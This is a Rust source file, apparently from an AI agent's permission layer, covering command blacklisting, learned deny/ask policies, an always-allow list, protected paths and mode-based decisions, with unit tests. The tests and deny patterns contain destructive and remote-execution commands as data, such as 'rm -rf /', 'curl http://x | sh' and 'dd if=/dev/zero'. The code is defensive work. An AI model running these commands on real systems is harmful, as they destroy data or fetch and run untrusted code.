    g.plugin_ui.insert(plugin.to_string(), perms);
    true
}

/// Remove the frontend grants of *plugin* (deactivate / uninstall undo).
pub fn permission_remove_plugin_ui(plugin: &str) -> bool {
    let mut g = manager().write().expect("permission lock poisoned");
    g.plugin_ui.remove(plugin.trim()).is_some()
}

/// Arbitrate one frontend surface for *plugin*.
///
/// *face* is `"providers"`, `"tool_meta"`, or `"contribution"` (with *kind*
/// = the contribution kind, e.g. `"theme"`).  Unknown plugins and unknown
/// faces always deny (fail-closed).
pub fn permission_check_plugin_ui(plugin: &str, face: &str, kind: &str) -> bool {
    let g = manager().read().expect("permission lock poisoned");
    let Some(perms) = g.plugin_ui.get(plugin.trim()) else {
        return false;
    };
    match face.trim() {
        "providers" => perms.all || perms.providers,
        "tool_meta" => perms.all || perms.tool_meta,
        "contribution" => {
            perms.all
                || perms.contributions.iter().any(|k| k == "*")
                || perms.contributions.iter().any(|k| k == kind.trim())
        }
        _ => false,
    }
}

/// Test tool input against the dangerous-pattern table, splitting the command
/// into subcommands first.
///
/// Primary target is the `bash` family, but ANY tool whose arguments carry a
/// non-empty `command` / `cmd` string is blacklisted too -- otherwise a
/// renamed or plugin-provided tool would be a free shell-execution channel.
fn match_dangerous(g: &ManagerInner, tool_name: &str, args: &str) -> Option<String> {
    match_dangerous_rule(g, tool_name, args)
        .map(|rule| rule.re.as_str().to_string())
}

/// Same traversal as :func:`match_dangerous`, but hands back the matching rule
/// so a caller can classify the hit (severity / category) rather than only
/// block it.
fn match_dangerous_rule(g: &ManagerInner, tool_name: &str, args: &str) -> Option<DangerousRule> {
    let is_bash_family = matches!(tool_name, "bash" | "bash_output");
    let command_text = if is_bash_family {
        extract_bash_command(args).unwrap_or_else(|| args.to_string())
    } else {
        extract_generic_command(args)?
    };
    let subcommands = split_shell_command(&command_text);
    // The unsplit command must be tested too, not only the pieces: patterns
    // that describe a *relationship across* an operator -- `curl x | sh`,
    // `iwr x | iex`, any `... | <interpreter>` -- cannot match a half. Splitting
    // alone left the whole remote-exec-via-pipe family unreachable.
    let mut effective = vec![command_text.clone()];
    effective.extend(subcommands);
    // The host's own section always applies; a named shell adds that family's
    // section too, so `terminal="bash"` on a Windows build is judged against
    // the Unix patterns it will really be caught by.
    let tags = danger_tags(args);
    for cmd in effective {
        let normalized = normalize_command_text(&cmd);
        if let Some(rule) = g.dangerous.find(&normalized, &tags) {
            return Some(rule.clone());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Learned policies — tightening-only floor
// ---------------------------------------------------------------------------

/// Normalise a scope/candidate string for substring matching: strip wrapping
/// quotes, forward-slash-normalise, lowercase and collapse whitespace runs.
fn normalize_scope(raw: &str) -> String {
    let unquoted = raw.trim().trim_matches(|c| c == '\'' || c == '"');
    let mut out = String::with_capacity(unquoted.len());
    let mut prev_space = false;
    for ch in unquoted.replace('\\', "/").to_lowercase().chars() {
        if ch.is_whitespace() {
            if !prev_space && !out.is_empty() {
                out.push(' ');
            }
            prev_space = true;
        } else {
            out.push(ch);
            prev_space = false;
        }
    }
    while out.ends_with(' ') {
        out.pop();
    }
    out
}

/// Pull path-like / command-like strings out of the JSON tool arguments so a
/// path-scoped learned entry can be matched.  Not exhaustive: a miss simply
/// means the scoped entry does not fire (never a false allow).
fn extract_input_paths(args: &str) -> Vec<String> {
    let Ok(parsed) = serde_json::from_str::<Value>(args) else {
        return Vec::new();
    };
    let mut out: Vec<String> = Vec::new();
    if let Some(obj) = parsed.as_object() {
        for key in [
            "path", "file_path", "filename", "filepath", "target", "dest", "destination",
        ] {
            if let Some(s) = obj.get(key).and_then(|v| v.as_str()) {
                if !s.trim().is_empty() {
                    out.push(s.to_string());
                }
            }
        }
        for key in ["command", "cmd", "patch", "diff"] {
            if let Some(s) = obj.get(key).and_then(|v| v.as_str()) {
                if !s.trim().is_empty() {
                    out.push(s.to_string());
                }
            }
        }
    }
    out
}

/// Evaluate the tightening-only learned-policy layer against a call.
///
/// Returns `None` when nothing matches.  Only `deny` / `ask` entries are ever
/// considered (an `allow` entry is skipped here as well as at insertion time),
/// and when several entries match the strictest decision wins -- a `deny` is
/// returned immediately, otherwise the first `ask` is kept.
fn match_learned(g: &ManagerInner, tool_name: &str, args: &str) -> Option<PermissionDecision> {
    let learned = g.state.learned.as_deref().unwrap_or(&[]);
    if learned.is_empty() {
        return None;
    }
    let caps = tool_capabilities(tool_name);
    // Candidate strings are extracted lazily, only once a scoped entry needs them.
    let mut path_candidates: Option<Vec<String>> = None;
    let mut command_text: Option<Option<String>> = None;
    let mut best: Option<PermissionDecision> = None;

    for entry in learned {
        let policy = entry.policy.as_str();
        if policy != "deny" && policy != "ask" {
            continue;
        }
        let target_ok = (!entry.tool.is_empty() && entry.tool == tool_name)
            || (!entry.capability.is_empty() && caps.contains(&entry.capability.as_str()));
        if !target_ok {
            continue;
        }
        if !entry.path_scope.is_empty() {
            let candidates = path_candidates.get_or_insert_with(|| extract_input_paths(args));
            let scope = normalize_scope(&entry.path_scope);
            if scope.is_empty() || !candidates.iter().any(|p| normalize_scope(p).contains(&scope)) {
                continue;
            }
        }
        if !entry.command_scope.is_empty() {
            let command = command_text.get_or_insert_with(|| extract_bash_command(args));
            let scope = normalize_scope(&entry.command_scope);
            let matched = command
                .as_deref()
                .map(|c| normalize_scope(c).contains(&scope))
                .unwrap_or(false);
            if scope.is_empty() || !matched {
                continue;
            }
        }
        if policy == "deny" {
            let reason = if entry.reason.is_empty() {
                format!("Tool {tool_name} is denied by a learned policy.")
            } else {
                entry.reason.clone()
            };
            return Some(PermissionDecision::Deny { reason });
        }
        if best.is_none() {
            let reason = if entry.reason.is_empty() {
                format!("Tool {tool_name} requires confirmation (learned policy).")
            } else {
                entry.reason.clone()
            };
            let rule = if entry.rule.is_empty() {
                "learned_policy".to_string()
            } else {
                entry.rule.clone()
            };
            best = Some(PermissionDecision::Ask { reason, rule });
        }
    }
    best
}

/// Combine two optional decisions, returning the stricter one.  `Deny` beats
/// `Ask`, so a learned entry can only ever tighten the dangerous-command
/// verdict -- never weaken it.
fn strictest(
    a: Option<PermissionDecision>,
    b: Option<PermissionDecision>,
) -> Option<PermissionDecision> {
    if matches!(a, Some(PermissionDecision::Deny { .. })) {
        return a;
    }
    if matches!(b, Some(PermissionDecision::Deny { .. })) {
        return b;
    }
    a.or(b)
}

// ---------------------------------------------------------------------------
// Always-allow list — tools that bypass ALL permission checks.
// These are non-dangerous tools (web fetch, search, memory, tasks, etc.)
// that should never prompt the user or be gated by a capability policy.
// ---------------------------------------------------------------------------

const ALWAYS_ALLOW: &[&str] = &[
    "web_fetch", "web_search",
    "cron_list",
    "task_get", "task_list", "task_update", "task_output",
    "memory_read", "memory_search", "memory_profile",
    "todo", "question",
];

/// Core authorization check used by every tool before execution.
///
/// Precedence (highest first):
/// 0.  Always-allow list (these tools skip all checks entirely).
/// 1.  Explicit Deny/Ask tool-level override from the policy table.
/// 2.  Explicit Deny/Ask capability-level override.
/// 3.  Hard floor: dangerous-pattern match for the `bash` tool family, per
///     subcommand, combined with the tightening-only learned-policy layer.
///     Runs BEFORE any Allow/Default policy so a blanket allow entry can
///     never silence the blacklist.  A learned entry can only tighten the
///     verdict (`deny` beats `ask`), never weaken it.
/// 4.  Allow-level tool policy.
/// 5.  Allow-level capability policy.
/// 6.  Default: allow.
///
/// Steps 1, 2, 4 and 5 consult the user-managed policy table, which only takes
/// effect in the `custom` permission mode.  In the preset modes the table is
/// skipped except for a transient "allow for this session" answer, so the
/// per-tool settings panel and the engine agree on when those rules apply.
///
/// The active mode also decides how a blacklisted subcommand (step 3) is
/// reported: manual approval / custom mode asks the user, while full access
/// (`bypass`) and auto approval (`auto`) deny it outright since neither mode
/// prompts.
pub fn permission_check(tool_name: &str, args: &str) -> PermissionDecision {
    let mode = {
        let g = manager().read().expect("permission lock poisoned");
        g.mode.clone()
    };
    permission_check_mode(tool_name, args, &mode)
}

/// Authorization check with the permission mode supplied by the caller.
///
/// The mode travels with the call instead of being read from the process-wide
/// slot populated by [`permission_set_mode`].  Several agent sessions with
/// different modes share one process, so a per-call mode is the only way to
/// guarantee the policy table is consulted exactly when the calling session is
/// in `custom` mode -- a global slot can always be overwritten by another
/// session between the push and the check.
pub fn permission_check_mode(tool_name: &str, args: &str, mode: &str) -> PermissionDecision {
    // 0) Always-allow tools skip everything.
    if ALWAYS_ALLOW.contains(&tool_name) {
        return PermissionDecision::Allow;
    }

    // 0b) Immune-path hard floor: destructive tools must never touch
    //     system-sensitive paths (.git/.claude/.ssh/shell-init), regardless
    //     of mode, policy table or danger level.  Consulted before every
    //     other layer so even an explicit Allow entry can never authorize a
    //     write into an immune path.
    if WRITE_TOOLS.contains(&tool_name) {
        if let Some(frag) = check_immune_args(args) {
            return PermissionDecision::Deny {
                reason: format!(
                    "Refused: target path '{frag}' is immune \
                     (system-sensitive: .git/.claude/.ssh/shell-init). \
                     Cannot be modified by the agent, even in bypass mode."
                ),
            };
        }
    }

    // 0c) Tool-ownership floor: a plugin-owned tool is denied the moment
    //     its plugin is deactivated/uninstalled, before any other layer.
    //     This closes the window between the registry-removal undo and the
    //     deactivate call itself -- the engine flips the ownership flag
    //     synchronously, so the tool is never callable while its plugin is
    //     inactive, regardless of mode.
    {
        let g = manager().read().expect("permission lock poisoned");
        if let Some(own) = g.tool_owner.get(tool_name) {
            if !own.active {
                return PermissionDecision::Deny {
                    reason: format!(
                        "Refused: tool '{}' belongs to plugin '{}' which is deactivated.",
                        tool_name, own.plugin
                    ),
                };
            }
        }
    }

    let mode = mode.trim().to_lowercase();
    let g = manager().read().expect("permission lock poisoned");
    let session_only = mode != "custom";

    // 1) Explicit Deny/Ask tool-level override wins outright.
    if let Some(p) = g.state.resolve_tool(tool_name, session_only) {
        if !matches!(p, PolicyValue::Allow | PolicyValue::Default) {
            return decision_from_policy(&p, tool_name);
        }
    }

    // 2) Explicit Deny/Ask capability-level override wins outright.
    for cap in tool_capabilities(tool_name) {
        if let Some(p) = g.state.resolve_capability(cap, session_only) {
            if !matches!(p, PolicyValue::Allow | PolicyValue::Default) {
                return decision_from_policy(&p, tool_name);
            }
        }
    }

    // 3) Hard floor: the bash dangerous-pattern blacklist and the
    //    tightening-only learned-policy layer.  The two are combined so the
    //    strictest verdict wins: a learned entry can tighten the outcome
    //    (e.g. deny a path the blacklist only asks about) but can never
    //    weaken a dangerous-command refusal, because a `deny` always beats an
    //    `ask`.  Full access ("bypass") and auto approval ("auto") never ask
    //    the user, so a blacklisted subcommand is refused outright there.
    let danger = match_dangerous(&g, tool_name, args).map(|rule| {
        if mode == "bypass" || mode == "auto" {
            PermissionDecision::Deny {
                reason: format!("Blocked by dangerous-command rule: {rule}"),
            }
        } else {
            PermissionDecision::Ask {
                reason: format!("Subcommand matches dangerous pattern: {rule}"),
                rule,
            }
        }
    });
    let learned = match_learned(&g, tool_name, args);
    if let Some(decision) = strictest(danger, learned) {
        return decision;
    }

    // 4) Allow-level tool policy.
    if let Some(p) = g.state.resolve_tool(tool_name, session_only) {
        if matches!(p, PolicyValue::Allow) {
            return decision_from_policy(&p, tool_name);
        }
    }

    // 5) Allow-level capability policy.
    for cap in tool_capabilities(tool_name) {
        if let Some(p) = g.state.resolve_capability(cap, session_only) {
            if matches!(p, PolicyValue::Allow) {
                return decision_from_policy(&p, tool_name);
            }
        }
    }

    // 6) Unconfigured default, gated by the tool's danger level (dynamic
    //    plugin table first, static classification as fallback):
    //    * bypass  -- full access never prompts; the blacklist floor above
    //      still refuses genuinely dangerous commands.
    //    * auto    -- auto approval never prompts the user, so an
    //      unconfigured high/critical tool is refused outright instead of
    //      silently executing (deny-by-default fallback).
    //    * accept_edits -- file-mutation tools are auto-approved, everything
    //      else high/critical still asks.
    //    * default / custom (interactive) -- high/critical tools ask the
    //      user via the frontend prompt; safe tools silently pass.
    let danger = resolve_tool_danger(tool_name, &g.tool_danger);
    if danger == ToolDanger::Safe {
        return PermissionDecision::Allow;
    }
    if mode == "bypass" {
        return PermissionDecision::Allow;
    }
    if mode == "accept_edits" && is_edit_family(tool_name) {
        return PermissionDecision::Allow;
    }
    if mode == "auto" {
        return PermissionDecision::Deny {
            reason: format!(
                "Tool {tool_name} is unconfigured and too dangerous for auto approval; configure an explicit policy for it."
            ),
        };
    }
    PermissionDecision::Ask {
        reason: format!(
            "Tool {tool_name} is a high-danger tool with no configured permission policy."
        ),
        rule: "unconfigured_danger_tool".to_string(),
    }
}

fn decision_from_policy(p: &PolicyValue, tool_name: &str) -> PermissionDecision {
    match p {
        PolicyValue::Allow => PermissionDecision::Allow,
        PolicyValue::Deny => PermissionDecision::Deny {
            reason: format!("Tool {tool_name} is denied by policy."),
        },
        PolicyValue::Ask => PermissionDecision::Ask {
            reason: format!("Tool {tool_name} is configured to ask for permission."),
            rule: "user_ask".to_string(),
        },
        PolicyValue::Default => PermissionDecision::Allow,
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_capabilities() {
        assert!(tool_capabilities("bash").contains(&"bash_io"));
        assert!(tool_capabilities("file_read").contains(&"file"));
        assert!(tool_capabilities("mcp__fs__read").contains(&"mcp"));
        // Always-allow tools carry no capabilities.
        assert!(tool_capabilities("todo").is_empty());
    }

    #[test]
    fn test_default_allows() {
        assert_eq!(permission_check("todo", "{}").behavior_str(), "allow");
    }

    #[test]
    fn test_deny_short_circuits() {
        let mut state = PolicyState::default();
        // Use a tool that is NOT on the always-allow list so the explicit
        // deny entry is actually reached.  The user-managed policy table is
        // custom-mode-only, so the test must run in custom mode.
        state
            .tools
            .insert("file_read".to_string(), PolicyValue::Deny);
        permission_set_policies(state);
        permission_set_mode("custom");
        match permission_check("file_read", "{}") {
            PermissionDecision::Deny { .. } => {}
            other => panic!("expected deny, got {other:?}"),
        }
        // Restore defaults for other tests.
        permission_set_mode("default");
        permission_set_policies(PolicyState::default());
    }

    #[test]
    fn test_universal_section_applies_on_every_host() {
        let table = DangerousTable::load_from_text(
            "[universal]\n\\bevil-tool\\b\n[windows]\n\\bwin-only\\b\n",
        );
        // A unix host must still see the universal rule, but not the Windows one.
        assert!(table.find("evil-tool run", &["linux"]).is_some());
        assert!(table.find("win-only", &["linux"]).is_none());
        assert!(table.find("evil-tool run", &["windows"]).is_some());
    }

    #[test]
    fn test_macos_still_inherits_linux_section() {
        let table = DangerousTable::load_from_text("[linux]\n\\brm\\b\n[macos]\n\\bhdiutil\\b\n");
        assert!(table.find("rm -rf /", &["macos"]).is_some());
        assert!(table.find("hdiutil erase", &["macos"]).is_some());
        // A plain linux tag must not pick up mac-only rules.
        assert!(table.find("hdiutil erase", &["linux"]).is_none());
    }

    /// Metadata is what lets Python drop its own blacklist: a hit has to carry
    /// how bad it is and of what kind, not merely that it matched.
    /// Directives must be set inside a section: a section header resets
    /// metadata so a rule cannot silently inherit from the previous section.
    #[test]
    fn test_directives_attach_severity_and_category() {
        let table = DangerousTable::load_from_text(
            "[linux]\n#! severity=critical category=fs\n\\brm\\s+-rf\\b\n\\bdd\\s+if=\n\
             #! severity=high category=priv-esc\n\\bsudo\\b\n\
             [windows]\n\\bformat\\b\n",
        );
        let hit = table.find("rm -rf /", &["linux"]).expect("rm matched");
        assert_eq!((hit.severity.as_str(), hit.category.as_str()), ("critical", "fs"));
        // The directive keeps applying until the next one...
        let dd = table.find("dd if=/dev/zero", &["linux"]).expect("dd matched");
        assert_eq!((dd.severity.as_str(), dd.category.as_str()), ("critical", "fs"));
        // ...and a later directive overrides it for its own lines.
        let sudo = table.find("sudo rm", &["linux"]).expect("sudo matched");
        assert_eq!((sudo.severity.as_str(), sudo.category.as_str()), ("high", "priv-esc"));
        // A new section resets to the default so metadata cannot leak across it.
        let fmt = table.find("format C:", &["windows"]).expect("format matched");
        assert_eq!((fmt.severity.as_str(), fmt.category.as_str()), ("high", ""));
    }

    /// A file written before metadata existed must match exactly as before.
    #[test]
    fn test_metadata_absent_keeps_historical_behaviour() {
        let table = DangerousTable::load_from_text("[linux]\n\\brm\\s+-rf\\b\n");
        let hit = table.find("rm -rf /", &["linux"]).expect("matched");
        assert_eq!(hit.severity, DANGER_DEFAULT_SEVERITY);
        assert!(hit.category.is_empty());
    }

    /// Guards the tests that swap the process-wide dangerous table -- without it
    /// they overwrite each other and pass for the wrong reason.
    static DANGER_TABLE_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    fn lock_danger_table() -> std::sync::MutexGuard<'static, ()> {
        DANGER_TABLE_LOCK.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
    }

    #[test]
    fn test_verdict_reports_metadata_end_to_end() {
        let _guard = lock_danger_table();
        permission_set_dangerous_patterns(
            "[universal]\n#! severity=critical category=fs\n\\bevil-tool\\b\n",
        );
        let verdict = permission_dangerous_verdict("bash", "{\"command\":\"evil-tool go\"}");
        assert_eq!(
            verdict,
            Some((r"\bevil-tool\b".to_string(), "critical".to_string(), "fs".to_string())),
        );
        assert!(permission_dangerous_verdict("bash", "{\"command\":\"ls\"}").is_none());
    }

    /// A blacklist rule may describe a relationship that only exists in the
    /// unsplit command, so the whole string has to be matched too.
    #[test]
    fn test_pipe_to_shell_is_matched_despite_subcommand_splitting() {
        let table = DangerousTable::load_from_text("[universal]\n\\|\\s*(?:ba|z)?sh\\b\n");
        // Each half on its own cannot match; only the joined form does.
        assert!(table.find("curl http://x", &["linux"]).is_none());
        assert!(table.find("sh", &["linux"]).is_none());
        assert!(table.find("curl http://x | sh", &["linux"]).is_some());

        let _guard = lock_danger_table();
        permission_set_dangerous_patterns("[universal]\n\\|\\s*(?:ba|z)?sh\\b\n");
        assert!(
            permission_check_dangerous("bash", "{\"command\":\"curl http://x | sh\"}").is_some(),
            "remote-exec-via-pipe must not be lost to splitting",
        );
    }

    /// Enforcement stays host-scoped while inspection can see every family, so
    /// the static analyzer never loses coverage it has today.
    #[test]
    fn test_matches_can_span_sections_for_inspection() {
        let _guard = lock_danger_table();
        permission_set_dangerous_patterns(
            "[linux]\n#! severity=critical category=fs\n\\bsudo\\b\n\
             [windows]\n#! severity=high category=power\n\\bshutdown\\b\n",
        );
        let inspect =
            permission_dangerous_matches("bash", "{\"command\":\"sudo shutdown /r\"}", true);
        assert_eq!(inspect.len(), 2, "inspection must see both families: {inspect:?}");
        assert!(inspect.iter().any(|(_, sev, _)| sev == "critical"));

        // Host-scoped enforcement must still report only this host's family.
        let scoped = permission_dangerous_matches("bash", "{\"command\":\"sudo\"}", false);
        if current_platform_tag() == "windows" {
            assert!(scoped.is_empty(), "linux-only rule must not fire for windows enforcement");
        }
    }

    #[test]
    fn test_shell_family_tag_mapping() {
        assert!(shell_family_tags("bash").contains(&"linux"));
        assert!(shell_family_tags("ZSH").contains(&"linux"));
        assert!(shell_family_tags("powershell").contains(&"windows"));
        assert!(shell_family_tags("cmd").contains(&"windows"));
        assert!(shell_family_tags("python").is_empty());
        assert!(shell_family_tags("").is_empty());
    }

    #[test]
    fn test_danger_tags_widen_for_the_requested_shell() {
        // Assertions are relative to the build host so they hold on any runner.
        let base = current_platform_tag();
        assert_eq!(danger_tags("{}"), vec![base]);
        assert_eq!(danger_tags("{\"terminal\":\"\"}"), vec![base]);

        let unix = danger_tags("{\"command\":\"rm -rf /\",\"terminal\":\"bash\"}");
        assert!(unix.contains(&base), "host tag must never be dropped");
        assert!(unix.contains(&"linux"));

        let win = danger_tags("{\"terminal\":\"powershell\"}");
        assert!(win.contains(&base));
        assert!(win.contains(&"windows"));
    }

    /// The hole this closes: a Windows binary used to skip every `[linux]`
    /// pattern even though the model may pass `terminal="bash"` and really run
    /// `rm -rf /`. Skipped on a Linux host, where the base tag already covers it.
    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_posix_rm_rf_is_caught_on_a_non_posix_host() {
        let _guard = lock_danger_table();
        permission_set_dangerous_patterns("[linux]\n\\brm\\s+.*-(?:[a-zA-Z]*r[a-zA-Z]*f|rf)\\b\n");
        let args = "{\"command\":\"rm -rf /\",\"terminal\":\"bash\"}";
        assert!(
            permission_check_dangerous("bash", args).is_some(),
            "rm -rf via terminal=bash must be caught on a {} build",
            current_platform_tag(),
        );
        // Same command with no shell named keeps the historical host-scoped
        // behaviour: not matched, because this host is not running a POSIX rm.
        assert!(permission_check_dangerous("bash", "{\"command\":\"rm -rf /\"}").is_none());
    }

}
